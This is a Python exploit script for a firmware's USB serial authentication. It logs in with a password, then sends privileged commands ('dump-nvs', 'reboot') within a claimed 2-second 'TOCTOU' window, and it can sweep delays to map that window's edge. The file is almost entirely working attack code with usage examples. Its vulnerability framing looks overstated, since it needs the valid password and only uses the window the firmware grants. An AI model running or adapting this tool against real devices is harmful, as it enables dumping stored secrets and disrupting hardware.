#!/usr/bin/env python3
"""
USB Authentication Race Condition Exploit.

Exploits the TOCTOU race in the USB serial auth mechanism. The firmware
grants a 2-second auth window after "usb-auth <password>", during which
any "usb-cmd <command>" executes with full privileges. A background task
polls every 50ms to clear the auth flag, but commands sent within the
window pass the check before expiry.

Requires: pyserial (pip install pyserial)
"""

import argparse
import re
import sys
import time


def open_serial(port, baud):
    """Open serial port, exit on failure."""
    try:
        import serial
    except ImportError:
        print("ERROR: pyserial is required. Install with: pip install pyserial",
              file=sys.stderr)
        sys.exit(1)

    try:
        ser = serial.Serial(port, baud, timeout=3)
    except serial.SerialException as e:
        print(f"ERROR: Could not open {port}: {e}", file=sys.stderr)
        sys.exit(1)

    return ser


def flush_serial(ser):
    """Flush any pending serial data."""
    time.sleep(0.3)
    ser.read(ser.in_waiting)


def authenticate(ser, password):
    """Send usb-auth command and return the response."""
    ser.write(f"usb-auth {password}\r\n".encode())
    time.sleep(0.15)
    response = ser.read(ser.in_waiting).decode("utf-8", errors="replace")
    return response


def send_command(ser, command, read_delay=2.0):
    """Send usb-cmd and capture the response."""
    ser.write(f"usb-cmd {command}\r\n".encode())
    time.sleep(read_delay)
    response = ser.read(ser.in_waiting).decode("utf-8", errors="replace")
    return response


def run_exploit(port, baud, password, command, delay):
    """Run the race condition exploit with a single delay value."""
    ser = open_serial(port, baud)

    try:
        flush_serial(ser)

        print(f"[*] Authenticating with password '{password}'...")
        auth_resp = authenticate(ser, password)
        auth_resp_stripped = auth_resp.strip()
        print(f"    Response: {auth_resp_stripped}")

        if "Authenticated" not in auth_resp:
            print("[-] Authentication failed. Check the password.")
            return False

        # Wait the specified delay before sending the privileged command
        if delay > 0:
            print(f"[*] Waiting {delay:.2f}s before sending command...")
            time.sleep(delay)

        print(f"[*] Sending privileged command: usb-cmd {command}")
        cmd_resp = send_command(ser, command)
        print()
        print("[+] Command output:")
        for line in cmd_resp.strip().splitlines():
            print(f"    {line}")

        authorized = ("Not authorized" not in cmd_resp and
                      ("Dumping" in cmd_resp or "privileged" in cmd_resp
                       or "NVS" in cmd_resp or "reboot" in cmd_resp.lower()))

        print()
        if authorized:
            print("[+] SUCCESS: Command executed within the auth window.")
        elif "Not authorized" in cmd_resp:
            print("[-] FAILED: Auth expired before command was processed.")
        else:
            print("[?] Command sent. Check output above for results.")

        return authorized

    finally:
        ser.close()


def run_sweep(port, baud, password, command):
    """Test multiple delays to find the auth window boundary."""
    delays = [0.1, 0.25, 0.5, 0.75, 1.0, 1.25, 1.5, 1.75, 2.0, 2.1, 2.5]

    print("[*] Sweeping delays to find the auth window boundary...")
    print(f"    Password: {password}")
    print(f"    Command:  usb-cmd {command}")
    print()
    print(f"    {'Delay (s)':<12} {'Result':<15} {'Status'}")
    print(f"    {'-' * 45}")

    results = []
    for delay in delays:
        ser = open_serial(port, baud)
        try:
            flush_serial(ser)

            # Authenticate
            auth_resp = authenticate(ser, password)
            if "Authenticated" not in auth_resp:
                print(f"    {delay:<12.2f} {'AUTH FAIL':<15} --")
                results.append((delay, None))
                continue

            # Wait, then send command
            time.sleep(delay)
            cmd_resp = send_command(ser, command, read_delay=1.5)

            if "Not authorized" in cmd_resp:
                status = "REJECTED"
                authorized = False
            elif "Dumping" in cmd_resp or "privileged" in cmd_resp or "NVS" in cmd_resp:
                status = "AUTHORIZED"
                authorized = True
            else:
                status = "UNKNOWN"
                authorized = None

            marker = ""
            if authorized:
                marker = "<-- within window"
            elif authorized is False and results and results[-1][1]:
                marker = "<-- boundary"

            print(f"    {delay:<12.2f} {status:<15} {marker}")
            results.append((delay, authorized))

        finally:
            ser.close()
            # Wait for auth timeout to clear before next attempt
            time.sleep(2.5)

    print()
    # Find the boundary
    last_success = None
    first_fail = None
    for delay, authorized in results:
        if authorized:
            last_success = delay
        elif authorized is False and last_success is not None and first_fail is None:
            first_fail = delay

    if last_success is not None:
        print(f"[+] Auth window boundary: commands succeed at {last_success:.2f}s", end="")
        if first_fail is not None:
            print(f", fail at {first_fail:.2f}s")
        else:
            print()
        print(f"[+] The 2-second auth window is confirmed.")
    else:
        print("[-] No successful commands detected. Check password and device state.")


def main():
    parser = argparse.ArgumentParser(
        description="USB auth race condition exploit - authenticate and send "
                    "privileged commands within the 2-second TOCTOU window.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s
      Authenticate and send 'dump-nvs' with 0.1s delay (default)

  %(prog)s --command reboot
      Execute a different privileged command

  %(prog)s --delay 1.5
      Wait 1.5 seconds after auth before sending the command

  %(prog)s --sweep
      Test delays from 0.1s to 2.5s to find the auth window boundary

  %(prog)s --port /dev/ttyUSB0 --password mypass --sweep
      Use a different port and password, sweep timing window

Notes:
  - The auth window is approximately 2 seconds (cleared by a background
    task polling every 50ms)
  - A 250ms delay() in usbCommand() widens the TOCTOU gap
  - Available privileged commands: dump-nvs, reboot
""")
    parser.add_argument("--port", "-p", default="/dev/ttyACM0",
                        help="Serial port (default: /dev/ttyACM0)")
    parser.add_argument("--baud", "-b", type=int, default=115200,
                        help="Baud rate (default: 115200)")
    parser.add_argument("--password", default="usbadmin",
                        help="USB auth password (default: usbadmin)")
    parser.add_argument("--command", "-c", default="dump-nvs",
                        help="Privileged command to execute (default: dump-nvs)")
    parser.add_argument("--delay", "-d", type=float, default=0.1,
                        help="Seconds to wait after auth before sending command "
                             "(default: 0.1)")
    parser.add_argument("--sweep", "-s", action="store_true",
                        help="Test multiple delays (0.1s to 2.5s) to map the "
                             "auth window boundary")

    args = parser.parse_args()

    print(f"[*] Target: {args.port} @ {args.baud} baud")
    print()

    if args.sweep:
        run_sweep(args.port, args.baud, args.password, args.command)
    else:
        run_exploit(args.port, args.baud, args.password, args.command,
                    args.delay)


if __name__ == "__main__":
    main()
